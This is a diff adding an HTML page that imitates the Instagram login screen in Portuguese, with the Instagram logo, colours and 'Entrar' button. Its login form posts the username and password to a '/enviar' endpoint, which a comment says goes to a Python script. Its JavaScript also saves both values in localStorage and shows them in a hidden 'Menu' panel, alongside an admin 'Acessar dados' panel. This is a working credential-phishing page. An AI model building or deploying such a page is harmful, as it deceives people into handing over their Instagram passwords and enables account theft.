@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            position: relative;
+        }
+
+        .container {
+            width: 350px;
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 0;
+            border-radius: 1px;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+        }
+
+        .logo img {
+            width: 175px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite ease-in-out;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            width: 80%;
+        }
+
+        .login-form input {
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            transition: border-color 0.3s ease;
+        }
+
+        .login-form input:focus {
+            border-color: #0095f6;
+            outline: none;
+        }
+
+        .login-form button {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 8px;
+            border-radius: 3px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            font-size: 14px;
+        }
+
+        .login-form button:hover {
+            background-color: #0077c5;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 80%;
+            margin: 20px 0;
+        }
+
+        .separator .line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .separator p {
+            margin: 0 10px;
+            color: #8e8e8e;
+            font-weight: bold;
+        }
+
+        .facebook-login {
+            background-color: #385185;
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 3px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 80%;
+            margin-bottom: 10px;
+            transition: background-color 0.3s ease;
+        }
+
+        .facebook-login:hover {
+            background-color: #2d4373;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            text-decoration: none;
+            font-size: 12px;
+            transition: color 0.3s ease;
+        }
+
+        .forgot-password:hover {
+            color: #002952;
+        }
+
+        .signup {
+            margin-top: 20px;
+        }
+
+        .signup a {
+            text-decoration: none;
+            color: #0095f6;
+            transition: color 0.3s ease;
+        }
+
+        .signup a:hover {
+            color: #0077c5;
+        }
+
+        .get-app {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .app-badges img {
+            width: 130px;
+            margin: 5px;
+            transition: transform 0.3s ease;
+        }
+
+        .app-badges img:hover {
+            transform: scale(1.05);
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                width: 90%;
+            }
+
+            .logo img {
+                width: 150px;
+            }
+        }
+
+        #adminPanel {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            border: 1px solid #ccc;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+        }
+
+        #adminPanel input {
+            margin-bottom: 10px;
+        }
+
+        #userData {
+            margin-top: 20px;
+        }
+
+        #menu {
+            display: none;
+            position: absolute;
+            top: 80px;
+            right: 20px;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.15);
+            width: 220px;
+            padding: 15px;
+            transition: opacity 0.3s ease;
+            opacity: 0;
+        }
+
+        #menu ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        #menu ul li {
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        #menu ul li a {
+            text-decoration: none;
+            color: #0095f6;
+            font-size: 14px;
+        }
+
+        #menu ul li a:hover {
+            color: #0077c5;
+        }
+
+        #menuButton {
+            position: absolute;
+            top: 5px;
+            right: 10px;
+            font-size: 8px;
+            padding: 3px;
+            background-color: white;
+            color: black;
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+        }
+
+        #menuButton:hover {
+            background-color: #f0f0f0;
+            transform: scale(1.1);
+        }
+
+        #menuButton:focus {
+            outline: none;
+        }
+
+        #menu.show {
+            display: block;
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="content">
+            <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2880px-Instagram_logo.svg.png" alt="Instagram Logo">
+</div>
+
+
+<form action="/enviar" method="POST" class="login-form" id="loginForm">
+    <input type="text" name="username" id="username" placeholder="Usuário" required>
+    <input type="password" name="password" id="password" placeholder="Senha" required>
+    <button type="submit">Entrar</button>
+</form>
+            <div class="separator">
+                <div class="line"></div>
+                <p>OU</p>
+                <div class="line"></div>
+            </div>
+            <button class="facebook-login">Entrar com o Facebook</button>
+            <a href="#" class="forgot-password">Esqueceu a senha?</a>
+        </div>
+        <div class="signup">
+            <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
+        </div>
+        <div class="get-app">
+            <p>Obtenha o aplicativo.</p>
+            <div class="app-badges">
+                <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3c/Download_on_the_App_Store_Badge.svg/2560px-Download_on_the_App_Store_Badge.svg.png" alt="App Store"></a>
+                <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png" alt="Google Play"></a>
+            </div>
+        </div>
+        <button id="menuButton">Menu</button>
+        <div id="menu">
+            <ul>
+                <li><strong>Usuário:</strong> <span id="savedUsername"></span></li>
+                <li><strong>Senha:</strong> <span id="savedPassword"></span></li>
+            </ul>
+        </div>
+    </div>
+
+    <div id="adminPanel">
+        <input type="password" id="adminPassword" placeholder="Senha de administrador">
+        <button id="adminSubmit">Acessar dados</button>
+        <div id="userData"></div>
+    </div>
+
+  <script>
+    // Mostrar/Ocultar menu
+    document.getElementById('menuButton').addEventListener('click', function() {
+        const menu = document.getElementById('menu');
+        menu.classList.toggle('show');
+    });
+
+    // Salvar dados no localStorage, mas permite envio para enviar.py
+    document.getElementById('loginForm').addEventListener('submit', function() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        // Salva localmente
+        localStorage.setItem('username', username);
+        localStorage.setItem('password', password);
+
+        // Atualiza o menu antes do redirecionamento
+        document.getElementById('savedUsername').textContent = username;
+        document.getElementById('savedPassword').textContent = password;
+        // NÃO usa preventDefault — o form será enviado para o Python normalmente
+    });
+
+    // Preenche os dados salvos ao carregar a página
+    window.addEventListener('load', function() {
+        const username = localStorage.getItem('username');
+        const password = localStorage.getItem('password');
+
+        if (username && password) {
+            document.getElementById('savedUsername').textContent = username;
+            document.getElementById('savedPassword').textContent = password;
+        }
+    });
+</script>
+
+</body>
+</html>
